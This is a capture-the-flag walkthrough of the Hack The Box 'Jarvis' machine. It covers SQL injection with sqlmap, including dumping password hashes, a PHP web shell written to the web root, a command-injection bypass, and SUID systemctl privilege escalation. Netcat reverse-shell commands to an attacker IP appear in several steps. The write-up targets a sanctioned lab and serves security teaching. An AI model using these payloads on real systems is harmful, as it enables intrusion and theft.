# :game_die: HTB | Jarvis - SQL & Command Injection

---

# HTB | Jarvis — SQL & Command Injection

This is the Box on [Hack The Box Linux Privilege Escalation 101 Track](https://app.hackthebox.com/tracks/Linux-Privilege-Escalation-101). Find the box [here](https://app.hackthebox.com/machines/194).

You can watch the video walkthrough [here](https://youtu.be/Tkb7y3-YRGc)

### Skill Learned

- SQL Injection — SQLMap

- Command Injection

- GTFObin — systemctl

## NMAP

IP: 10.10.10.143

```
nmap -sT -p- --min-rate 10000 10.10.10.143
```

```
nmap -sC -sV -p 22,80 10.10.10.143
```

*nmap*

## Port 80

*port 80*

Let’s do directory fuzzing While clicking on the website we know it is running on php.

```
gobuster dir -u http://10.10.10.143/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -x php -t 40
```

*gobuster*

When I clicked on book room it took me to` http://10.10.10.143/room.php?cod=1` URL

*[http://10.10.10.143/room.php?cod=1](http://10.10.10.143/room.php?cod=1)*

While trying `'` at the end we broke the image meaning SQL injection is possible

```
http://10.10.10.143/room.php?cod=1'
```

*[http://10.10.10.143/room.php?cod=1'](http://10.10.10.143/room.php?cod=1%27)*

## Foothold/shell

## SQLMAP

```
sqlmap -u http://10.10.10.143/room.php?cod=1
```

*sqlmap -u [http://10.10.10.143/room.php?cod=1](http://10.10.10.143/room.php?cod=1)*

Now we know the backend is MYSQL and it is vulnerable to SQL injection

I can try and dump the username and password

```
sqlmap -u http://10.10.10.143/room.php?cod=1 --users --passwords
```

*sqlmap -u [http://10.10.10.143/room.php?cod=1](http://10.10.10.143/room.php?cod=1) — users — passwords*

Now we have the password, we can try and upload the cmd.php to the server and try to get the shell

```
SELECT '<?php system($_GET["cmd"]);?>'
```

*cmd.php*

Now let’s upload the cmd.php

```
sqlmap -u http://10.10.10.143/room.php?cod=1 --file-write cmd.php --file-dest /var/www/html/cmd.php
```

```
--file-write cmd.php: This option tells sqlmap to write a local file (in this case, cmd.php) to the target server.
--file-dest /var/www/html/cmd.php: This specifies the destination path on the target server where the file will be uploaded (in this case, /var/www/html/cmd.php).
```

Now I can reach the server

```
curl http://10.10.10.143/cmd.php?cmd=id --output -
```

*curl [http://10.10.10.143/cmd.php?cmd=id](http://10.10.10.143/cmd.php?cmd=id) — output -*

### Shell

I can get the reverse shell

```
curl http://10.10.10.143/cmd.php?cmd=nc+10.10.14.4+1234+-e+/bin/bash
```

*curl [http://10.10.10.143/cmd.php?cmd=nc+10.10.14.4+1234+-e+/bin/bash](http://10.10.10.143/cmd.php?cmd=nc+10.10.14.4+1234+-e+%2Fbin%2Fbash)nc -nlvp 1234*

and we are in

```
sudo -l
```

*sudo -l*

pepper is the owner of the file simpler.py

The script itself is a python3 script used to manage and provide statistics on the webserver:

*simpler.py*

Looking at the usage of the script, there is one interesting command line option `Ping an IP`

`exec_ping` is called directly from the main if the `-p` is given:

## Command Injection

There’s a clear command injection in the exec_ping code where my input is read to the command

## Get anuragtaparia’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

The problem is that I can’t use any of the forbidden characters

I tried `exec_ping `to ping my own system and it worked.

I tried `$(echo 4)` and it worked

Since I can run any command within `$(),` I can try to get the shell

```
echo -e '#!/bin/bash\n\nnc -e /bin/bash 10.10.14.4 7777' > /tmp/pep.sh
```

and we found user.txt

*user.txt*

## Priv Esc

Let’s copy *LinEnum.sh* to the box

and run `./LinEnum.sh`

I’m specifically interested in `/bin/systemctl`. This binary is a systemd utility which is responsible for Controlling the systemd system and service manager. That is, it creates and manages services. And in this case, only root and users in the group pepper (me) can run it, and it will run as root (because it is a SUID).

## Malicious Service

A service is defined by a .service file. The systemctl is used to link it to systemd, and then used again to start the service. What the service does is defined by the .service file.

[Gtfobins](https://gtfobins.github.io/gtfobins/systemctl/#suid) has a page for systemctl, and it gives an example where a single command is executed and output to a file in tmp. I’ll modify that slightly to give me a shell.

```
cat >at.service<<EOF
[Service]
Type=notify
ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.14.4 2222'
KillMode=process
Restart=on-failure
RestartSec=42s
[Install]
WantedBy=multi-user.target
EOF
```

Now I use systemctl to link this service:

```
systemctl link /dev/shm/at.service
systemctl start at.service
```

Note: Make the at.servcie in /dev/shm for some reason it was not working for /tmp

and we are in. We found root.txt

*root.txt*

If you enjoyed this article and want to dive deeper into cybersecurity topics, feel free to explore my detailed write-ups on GitBook. I cover a range of topics including vulnerability assessments, penetration testing techniques, and security methodologies.

👉 [Check out my GitBook for more insights](https://anuragtaparia.gitbook.io/write-ups)

👉 Watch my videos on YouTube: [AnuragSec](http://www.youtube.com/@AnuragSec)

Stay tuned for more content, and don’t forget to follow for future updates!

---
